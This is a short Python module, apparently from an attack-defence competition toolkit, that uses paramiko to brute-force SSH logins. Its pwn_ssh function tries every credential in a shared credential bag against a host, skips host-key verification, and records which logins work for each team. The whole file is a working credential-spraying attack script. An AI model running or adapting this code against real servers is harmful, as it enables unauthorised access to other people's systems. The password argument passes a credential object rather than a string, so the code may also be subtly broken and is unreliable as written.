from typing import Tuple

import paramiko

from .credentials import CredentialBag


def _get_ssh_client():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    return ssh


def pwn_ssh(url: str, port: int, team: int) -> Tuple[str, bool, bool]:
    ssh = _get_ssh_client()
    bag = CredentialBag.get_instance()

    working = 0
    for credential in bag.credentials():
        try:
            ssh.connect(url, port=port, username=credential.username, password=credential)
            credential.mark_works(team)
            working += 1
        except:
            continue

    if working:
        return "Found credentials", True, False
    else:
        return 'Authentication failed', False, False


PWN_FUNCS = {
    'ssh': pwn_ssh,
}
